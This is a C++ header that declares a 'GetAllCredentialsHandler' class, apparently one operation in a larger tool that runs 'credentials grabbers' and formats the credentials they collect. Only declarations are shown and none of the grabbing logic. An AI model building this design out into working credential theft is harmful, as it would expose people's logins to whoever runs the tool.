#pragma once
#include "Json.hpp"
#include "../Grabbers/CredentialsGrabber.hpp"
#include "Handlers/IOperationHandler.hpp"

class GetAllCredentialsHandler final : public IOperationHandler
{
public:
	explicit GetAllCredentialsHandler(std::unique_ptr<Event> operation_event);
	~GetAllCredentialsHandler() override = default;
	GetAllCredentialsHandler(const GetAllCredentialsHandler&) = delete;
	GetAllCredentialsHandler& operator=(const GetAllCredentialsHandler&) = delete;
	GetAllCredentialsHandler(GetAllCredentialsHandler&&) = delete;
	GetAllCredentialsHandler& operator=(GetAllCredentialsHandler&&) = delete;

private:
	[[nodiscard]] static std::wstring format_source(const std::wstring& source);
	[[nodiscard]] static std::wstring format_credential(const Credential& credential);

public:
	void run() override;

	[[nodiscard]] static inline std::vector<CredentialsGrabber::Ptr> make_grabbers();
};
